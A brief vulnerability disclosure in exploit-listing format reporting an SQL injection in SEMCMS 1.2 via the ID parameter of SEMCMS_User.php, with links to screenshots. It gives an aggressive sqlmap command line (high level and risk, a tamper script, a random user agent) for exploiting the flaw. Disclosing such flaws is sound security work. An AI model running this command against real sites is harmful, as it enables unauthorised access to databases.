* Exploit Title: SENMCMS 1.2 -  SQL injection

* Vendor Homepage:http://www.sem-cms.com

* Software Link:http://www.sem-cms.com/xiazai.html

* Version: 1.2 

* Vulnerable file:SEMCMS_User.php 
![iamge](https://github.com/BigTiger2020/SEMCMS/blob/main/SEMCMS_User.php.png)  
* SQL injection
sql command:sqlmap.py -r 7.txt --dbms=mysql --level=3 --risk=3 -p ID --tamper=space2comment --random-agent   

![iamge](https://github.com/BigTiger2020/SEMCMS/blob/main/sql-2.png)  
